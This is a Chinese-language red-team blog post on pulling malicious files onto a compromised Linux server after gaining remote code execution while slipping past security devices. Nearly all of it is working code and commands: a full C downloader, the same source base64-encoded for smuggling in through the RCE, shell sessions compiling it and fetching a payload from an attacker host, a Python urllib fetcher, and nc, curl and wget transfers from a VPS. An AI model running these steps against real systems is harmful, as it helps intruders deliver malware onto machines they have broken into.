---
title: linux下载远程恶意文件
tags:
  - 红队技术
  - Linux安全
categories: 红队技术
date: 2022-02-14 18:06:47
---


<font style="color:Gray; float:left">躁胜寒，静胜热，清静为天下正。</font><br>

<font style="color:Gray; float:right">——《道德经》</font>

<br>

在进行红队测试的时候，假如获取到一个linux服务的RCE漏洞，我们可能需要绕过安全设备下载恶意文件，并运行。因此，总结几种手法来下载恶意文件。

<!-- more -->



## 编译c代码下载

如下c代码类似于wget命令。

- shadowget.c

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <netdb.h>

#define BUFSIZE 1024

/**
 * @brief 获取http头部信息
 *
 * @param fd [in] 	sock套接字
 * @param buf [in] 	存放http头部信息缓冲区
 * @param bufLen [in] 	缓冲区长度
 *
 * @return 成功：http头部/失败：-1
 */
int getHttpHead(int fd, char *buf, int bufLen)
{
	char tmp[1] = {0};
	int i = 0;
	int offset = 0;
	int nbytes = 0;

	while((nbytes=recv(fd,tmp,1, 0))==1)
	{
		if(offset > bufLen-1)
		{
			return bufLen;
		}
		
		if(i < 4)
		{
			if(tmp[0] == '\r' || tmp[0] == '\n') i++;
			else i = 0;
			
			strncpy(buf+offset, tmp, 1);
			offset++;
		}
		
		if(4 == i)
		{
			return offset;
		}
	}
	
	return -1;
}

/**
 * @brief 与URL建立连接，并获取sock_fd
 *
 * @param url [in] 	URL地址
 *
 * @return sock_fd
 */
int geturl(char* url)
{
	int			cfd;
	struct sockaddr_in	cadd;
	struct hostent		*pURL = NULL;
	char			host[BUFSIZE], GET[BUFSIZE];
	char			request[BUFSIZE];
	char			text[BUFSIZE] = {0};

	//分离主机中的主机地址和相对路径
	memset(host, 0, BUFSIZE);
	memset(GET, 0, BUFSIZE);
	memset(request, 0, BUFSIZE);
	memset(text, 0, BUFSIZE);
	
	sscanf(url, "%*[^//]//%[^/]%s", host, GET);

	printf("GET = %s\n", GET);
	printf("host = %s\n", host);
	printf("url = %s\n", url);

	//设置socket参数
	if (-1 == (cfd = socket( AF_INET, SOCK_STREAM, 0)))
	{
		printf( "create socket failed of client!\n" );
		return -1;
	}

	//将上面获得的主机信息通过域名解析函数获得域名信息
	pURL = gethostbyname(host);

	//设置IP地址结构
	bzero(&cadd, sizeof(struct sockaddr_in));
	cadd.sin_family			= AF_INET;
	cadd.sin_addr.s_addr	= *((unsigned long *)pURL->h_addr_list[0]);
	cadd.sin_port			= htons(80);
	
	//向HTTP服务器发送URL信息
	snprintf(request, BUFSIZE, 		\
				"GET %s HTTP/1.1\r\n"
				"HOST: %s\r\n"
				"Cache-Control: no-cache\r\n"
				"Connection: close\r\n\r\n",
				GET,host);

	printf("\nrequest = \n%s\n", request);
	
	//连接服务器
	if (-1 == connect(cfd, (struct sockaddr *)&cadd, (socklen_t)sizeof(cadd)))
	{
		printf( "connect failed of client!\n" );
		return -1;
	}

	//向服务器发送url请求的request
	if (-1 ==send(cfd, request, strlen( request ), 0 ))
	{
		printf( "向服务器发送请求的request失败!\n" );
		return -1;
	}

	//客户端接收服务器的返回信息
	getHttpHead(cfd, text, sizeof(text));
	printf("head = :\n%s\n", text);
	
	return cfd;
}


/**
 * @brief 获取URL中的文件名
 *
 * @param URLPath [in] 	URL地址
 *
 * @return 文件名
 */
char *GetFileName(char *URLPath)
{
    char ch = '/';
    char *q = strrchr(URLPath, ch) + 1;

    return q;
}

int main(int argc, char* argv[])
{
	int sockfd = -1;
	char		buf[BUFSIZE] = {0};
	char		fileName[BUFSIZE] = {0};
	int			fd = -1;
	
	if ( argc < 2 )
	{
		printf( "用法:%s url网页网址\n", argv[0] );
		return -1;
	}
	
	strncpy(fileName, GetFileName(argv[1]), BUFSIZE);
	sockfd = geturl(argv[1]);
	
	printf("fileName = %s\n", fileName);
	remove(fileName);
	
	fd = open(fileName, O_WRONLY | O_CREAT, 777 );
	if(fd == -1)
	{
		perror( "OPen error" );
		return -1;
	}
	
	while (1)
	{
		memset( buf, 0, BUFSIZE );
		int cr;
		cr = recv(sockfd, buf, BUFSIZE, 0);
		if ( cr <= 0 )
		{
			printf("break\n");
			break;
		}
		write(fd, buf, cr);
	}
	
	close(fd);
	close(sockfd);
	return 0;
}

```

我们在攻击机上将其转为base64文件

```
cat shadowget.c | base64 > shadowget.txt
```

结果如下：

```
I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+
CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPG5ldGRiLmg+CgojZGVmaW5lIEJVRlNJWkUg
MTAyNAoKLyoqCiAqIEBicmllZiDojrflj5ZodHRw5aS06YOo5L+h5oGvCiAqCiAqIEBwYXJhbSBm
ZCBbaW5dIAlzb2Nr5aWX5o6l5a2XCiAqIEBwYXJhbSBidWYgW2luXSAJ5a2Y5pS+aHR0cOWktOmD
qOS/oeaBr+e8k+WGsuWMugogKiBAcGFyYW0gYnVmTGVuIFtpbl0gCee8k+WGsuWMuumVv+W6pgog
KgogKiBAcmV0dXJuIOaIkOWKn++8mmh0dHDlpLTpg6gv5aSx6LSl77yaLTEKICovCmludCBnZXRI
dHRwSGVhZChpbnQgZmQsIGNoYXIgKmJ1ZiwgaW50IGJ1ZkxlbikKewoJY2hhciB0bXBbMV0gPSB7
MH07CglpbnQgaSA9IDA7CglpbnQgb2Zmc2V0ID0gMDsKCWludCBuYnl0ZXMgPSAwOwoKCXdoaWxl
KChuYnl0ZXM9cmVjdihmZCx0bXAsMSwgMCkpPT0xKQoJewoJCWlmKG9mZnNldCA+IGJ1Zkxlbi0x
KQoJCXsKCQkJcmV0dXJuIGJ1ZkxlbjsKCQl9CgkJCgkJaWYoaSA8IDQpCgkJewoJCQlpZih0bXBb
MF0gPT0gJ1xyJyB8fCB0bXBbMF0gPT0gJ1xuJykgaSsrOwoJCQllbHNlIGkgPSAwOwoJCQkKCQkJ
c3RybmNweShidWYrb2Zmc2V0LCB0bXAsIDEpOwoJCQlvZmZzZXQrKzsKCQl9CgkJCgkJaWYoNCA9
PSBpKQoJCXsKCQkJcmV0dXJuIG9mZnNldDsKCQl9Cgl9CgkKCXJldHVybiAtMTsKfQoKLyoqCiAq
IEBicmllZiDkuI5VUkzlu7rnq4vov57mjqXvvIzlubbojrflj5Zzb2NrX2ZkCiAqCiAqIEBwYXJh
bSB1cmwgW2luXSAJVVJM5Zyw5Z2ACiAqCiAqIEByZXR1cm4gc29ja19mZAogKi8KaW50IGdldHVy
bChjaGFyKiB1cmwpCnsKCWludAkJCWNmZDsKCXN0cnVjdCBzb2NrYWRkcl9pbgljYWRkOwoJc3Ry
dWN0IGhvc3RlbnQJCSpwVVJMID0gTlVMTDsKCWNoYXIJCQlob3N0W0JVRlNJWkVdLCBHRVRbQlVG
U0laRV07CgljaGFyCQkJcmVxdWVzdFtCVUZTSVpFXTsKCWNoYXIJCQl0ZXh0W0JVRlNJWkVdID0g
ezB9OwoKCS8v5YiG56a75Li75py65Lit55qE5Li75py65Zyw5Z2A5ZKM55u45a+56Lev5b6ECglt
ZW1zZXQoaG9zdCwgMCwgQlVGU0laRSk7CgltZW1zZXQoR0VULCAwLCBCVUZTSVpFKTsKCW1lbXNl
dChyZXF1ZXN0LCAwLCBCVUZTSVpFKTsKCW1lbXNldCh0ZXh0LCAwLCBCVUZTSVpFKTsKCQoJc3Nj
YW5mKHVybCwgIiUqW14vL10vLyVbXi9dJXMiLCBob3N0LCBHRVQpOwoKCXByaW50ZigiR0VUID0g
JXNcbiIsIEdFVCk7CglwcmludGYoImhvc3QgPSAlc1xuIiwgaG9zdCk7CglwcmludGYoInVybCA9
ICVzXG4iLCB1cmwpOwoKCS8v6K6+572uc29ja2V05Y+C5pWwCglpZiAoLTEgPT0gKGNmZCA9IHNv
Y2tldCggQUZfSU5FVCwgU09DS19TVFJFQU0sIDApKSkKCXsKCQlwcmludGYoICJjcmVhdGUgc29j
a2V0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoKCS8v5bCG5LiK6Z2i
6I635b6X55qE5Li75py65L+h5oGv6YCa6L+H5Z+f5ZCN6Kej5p6Q5Ye95pWw6I635b6X5Z+f5ZCN
5L+h5oGvCglwVVJMID0gZ2V0aG9zdGJ5bmFtZShob3N0KTsKCgkvL+iuvue9rklQ5Zyw5Z2A57uT
5p6ECgliemVybygmY2FkZCwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOwoJY2FkZC5zaW5f
ZmFtaWx5CQkJPSBBRl9JTkVUOwoJY2FkZC5zaW5fYWRkci5zX2FkZHIJPSAqKCh1bnNpZ25lZCBs
b25nICopcFVSTC0+aF9hZGRyX2xpc3RbMF0pOwoJY2FkZC5zaW5fcG9ydAkJCT0gaHRvbnMoODAp
OwoJCgkvL+WQkUhUVFDmnI3liqHlmajlj5HpgIFVUkzkv6Hmga8KCXNucHJpbnRmKHJlcXVlc3Qs
IEJVRlNJWkUsIAkJXAoJCQkJIkdFVCAlcyBIVFRQLzEuMVxyXG4iCgkJCQkiSE9TVDogJXNcclxu
IgoJCQkJIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiIKCQkJCSJDb25uZWN0aW9uOiBjbG9z
ZVxyXG5cclxuIiwKCQkJCUdFVCxob3N0KTsKCglwcmludGYoIlxucmVxdWVzdCA9IFxuJXNcbiIs
IHJlcXVlc3QpOwoJCgkvL+i/nuaOpeacjeWKoeWZqAoJaWYgKC0xID09IGNvbm5lY3QoY2ZkLCAo
c3RydWN0IHNvY2thZGRyICopJmNhZGQsIChzb2NrbGVuX3Qpc2l6ZW9mKGNhZGQpKSkKCXsKCQlw
cmludGYoICJjb25uZWN0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoK
CS8v5ZCR5pyN5Yqh5Zmo5Y+R6YCBdXJs6K+35rGC55qEcmVxdWVzdAoJaWYgKC0xID09c2VuZChj
ZmQsIHJlcXVlc3QsIHN0cmxlbiggcmVxdWVzdCApLCAwICkpCgl7CgkJcHJpbnRmKCAi5ZCR5pyN
5Yqh5Zmo5Y+R6YCB6K+35rGC55qEcmVxdWVzdOWksei0pSFcbiIgKTsKCQlyZXR1cm4gLTE7Cgl9
CgoJLy/lrqLmiLfnq6/mjqXmlLbmnI3liqHlmajnmoTov5Tlm57kv6Hmga8KCWdldEh0dHBIZWFk
KGNmZCwgdGV4dCwgc2l6ZW9mKHRleHQpKTsKCXByaW50ZigiaGVhZCA9IDpcbiVzXG4iLCB0ZXh0
KTsKCQoJcmV0dXJuIGNmZDsKfQoKCi8qKgogKiBAYnJpZWYg6I635Y+WVVJM5Lit55qE5paH5Lu2
5ZCNCiAqCiAqIEBwYXJhbSBVUkxQYXRoIFtpbl0gCVVSTOWcsOWdgAogKgogKiBAcmV0dXJuIOaW
h+S7tuWQjQogKi8KY2hhciAqR2V0RmlsZU5hbWUoY2hhciAqVVJMUGF0aCkKewogICAgY2hhciBj
aCA9ICcvJzsKICAgIGNoYXIgKnEgPSBzdHJyY2hyKFVSTFBhdGgsIGNoKSArIDE7CgogICAgcmV0
dXJuIHE7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyKiBhcmd2W10pCnsKCWludCBzb2NrZmQg
PSAtMTsKCWNoYXIJCWJ1ZltCVUZTSVpFXSA9IHswfTsKCWNoYXIJCWZpbGVOYW1lW0JVRlNJWkVd
ID0gezB9OwoJaW50CQkJZmQgPSAtMTsKCQoJaWYgKCBhcmdjIDwgMiApCgl7CgkJcHJpbnRmKCAi
55So5rOVOiVzIHVybOe9kemhtee9keWdgFxuIiwgYXJndlswXSApOwoJCXJldHVybiAtMTsKCX0K
CQoJc3RybmNweShmaWxlTmFtZSwgR2V0RmlsZU5hbWUoYXJndlsxXSksIEJVRlNJWkUpOwoJc29j
a2ZkID0gZ2V0dXJsKGFyZ3ZbMV0pOwoJCglwcmludGYoImZpbGVOYW1lID0gJXNcbiIsIGZpbGVO
YW1lKTsKCXJlbW92ZShmaWxlTmFtZSk7CgkKCWZkID0gb3BlbihmaWxlTmFtZSwgT19XUk9OTFkg
fCBPX0NSRUFULCA3NzcgKTsKCWlmKGZkID09IC0xKQoJewoJCXBlcnJvciggIk9QZW4gZXJyb3Ii
ICk7CgkJcmV0dXJuIC0xOwoJfQoJCgl3aGlsZSAoMSkKCXsKCQltZW1zZXQoIGJ1ZiwgMCwgQlVG
U0laRSApOwoJCWludCBjcjsKCQljciA9IHJlY3Yoc29ja2ZkLCBidWYsIEJVRlNJWkUsIDApOwoJ
CWlmICggY3IgPD0gMCApCgkJewoJCQlwcmludGYoImJyZWFrXG4iKTsKCQkJYnJlYWs7CgkJfQoJ
CXdyaXRlKGZkLCBidWYsIGNyKTsKCX0KCQoJY2xvc2UoZmQpOwoJY2xvc2Uoc29ja2ZkKTsKCXJl
dHVybiAwOwp9CgoK
```

我们在RCE漏洞下执行如下命令将上述base64字符串写入

```
echo "xxxxx" > shadowget.txt

[root@vuln /tmp]# base64 -d shadowget.txt > shadowget.c
[root@vuln /tmp]# gcc -o shadowget shadowget.c
[root@vuln /tmp]# ./shadowget http://172.16.42.151/aa.php
GET = /aa.php
host = 172.16.42.151
url = http://172.16.42.151/aa.php
......
fileName = aa.php
break
[root@vuln /tmp]# ls
1.txt  aa.php shadowget.txt shadowget.c shadowget
[root@vuln /tmp]#
```

使用`./shadowget http://172.16.42.151/aa.php`成功下载了aa.php





## python脚本下载

跟上述方法一样转为base64写入

- a.py

```
import urllib 
url = 'http://172.16.42.151/aa.php'  
urllib.urlretrieve(url, "aa.php")
```

最后执行`python a.py`

```
[root@vuln /tmp]# ls
aa.php
[root@vuln /tmp]# python a.py
[root@vuln /tmp]# ls
aa.php  a.py
```



## 使用nc传输

vps作为服务端

```
nc -lvvp 33033 < aa.php
```

靶机作为客户端下载

```
nc 172.16.42.150 33033 > aa.php
```

靶机下载完后后关闭

```
[root@vuln /tmp]# ls
[root@vuln /tmp]# nc 172.16.42.150 33033 > aa.ph
^C
[root@vuln /tmp]# cat aa.php
sdfsdfsdf
```



## 使用curl命令下载

```
curl http://172.16.42.151/aa.php -o aa
```



## 使用wget命令下载

```
wget http://172.16.42.151/aa.php
```







## 参考

https://www.codeleading.com/article/62605839291/
